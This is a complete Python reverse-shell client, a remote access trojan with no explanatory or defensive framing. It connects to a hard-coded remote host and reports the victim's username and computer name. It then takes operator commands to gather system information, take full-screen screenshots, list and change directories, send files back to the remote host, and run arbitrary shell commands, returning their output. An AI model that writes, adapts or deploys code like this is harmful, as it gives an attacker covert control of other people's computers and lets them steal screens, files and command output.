import socket
import subprocess
import colorama
import platform 
import getpass
import os
from time import sleep
from mss import mss


REMOTE_HOST = '192.168.0.29' # '192.168.43.82'
REMOTE_PORT = 8081 # 2222
client = socket.socket()
print("[-] Connection Initiating...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection initiated!")
header = f"""
{getpass.getuser()}@{platform.node()}
"""
client.send(header.encode())

while True:
    command = client.recv(1024)
    command = command.decode()

    if command == "?sysinfo":
        sysinfo = f"""
Operating System: {platform.system()}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
Release Version: {platform.release()}
Processor Architecture: {platform.processor()}
            """
        client.send(sysinfo.encode())
    elif command == "?exit":
        exit()

    elif command == "?ss":
        with mss() as sct:
            filename = sct.shot(mon=-1, output='fullscreen.png')
            client.send(b"Screenshot Taken! Use <download fullscreen.png> to download the image")
    
    elif command == "?help":
        with mss() as sct:
            filename = sct.shot(mon=-1, output='fullscreen.png')
            client.send(b"Screenshot Taken! Use <download fullscreen.png> to download the image")


    elif command == "?ls":
        client.send(str(os.listdir(".")).encode())

    elif command.split(" ")[0] == "?cd":
        os.chdir(command.split(" ")[1])
        client.send("Changed directory to {}".format(os.getcwd()).encode())

    elif command.split(" ")[0] == "?download":
      with open(command.split(" ")[1], "rb") as f:
        file_data = f.read(1024)
        while file_data:
            client.send(file_data)
            file_data = f.read(1024)
        sleep(2)
        client.send(b"DONE")

    else:
        comm = subprocess.Popen(str(command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        STDOUT, STDERR = comm.communicate()
        if not STDOUT:
            client.send(STDERR)
        else:
            client.send(STDOUT)